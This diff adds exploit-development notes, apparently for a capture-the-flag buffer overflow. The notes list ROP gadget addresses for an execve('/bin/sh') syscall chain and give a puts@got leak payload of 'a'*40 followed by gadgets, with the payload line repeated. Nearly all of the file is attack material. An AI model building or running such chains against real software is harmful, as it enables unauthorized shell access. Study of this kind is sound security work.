@@ -1,0 +1,43 @@
+rax <- 0x3b 
+0x000000000003a738: pop rax; ret; 
+0x000000000003a808: pop rax; ret; 
+0x000000000003a8b1: pop rax; ret; 
+0x00000000000abc87: pop rax; ret; 
+0x0000000000106373: pop rax; ret; 
+
+rdi <- '/bin/sh' at 0x18ce57
+0x00000000001432b7: pop rdi; ret; 
+0x000000000014349a: pop rdi; ret; 
+0x00000000001441c8: pop rdi; ret; 
+0x000000000014437d: pop rdi; ret; 
+0x0000000000173012: pop rdi; ret; 
+0x0000000000173e3d: pop rdi; ret; 
+0x0000000000174dc5: pop rdi; ret; 
+0x0000000000174ddf: pop rdi; ret; 
+0x000000000017529e: pop rdi; ret; 
+0x000000000017533f: pop rdi; ret; 
+0x000000000019dca5: pop rdi; ret; 
+
+rsi <- NULL
+0x00000000000202f8: pop rsi; ret; 
+0x0000000000021110: pop rsi; pop r15; ret; 
+0x00000000000cd737: pop rsi; pop rbp; ret; 
+
+rdx <- NULL
+0x0000000000001b92: pop rdx; ret; 
+0x0000000000001b96: pop rdx; ret; 
+0x0000000000001b9a: pop rdx; ret; 
+0x0000000000001b9e: pop rdx; ret; 
+0x00000000001151a6: pop rdx; ret;
+
+syscall
+0x00000000001752f8: syscall;
+------------------
+
+rdi <- puts@got
+0x0000000000400653: pop rdi; ret;
+
+
+payload = 'a'*40 + pop_rdi + puts@got + puts@plt
+
+payload = 'a'*40 + pop_rdi + puts@got + puts@plt
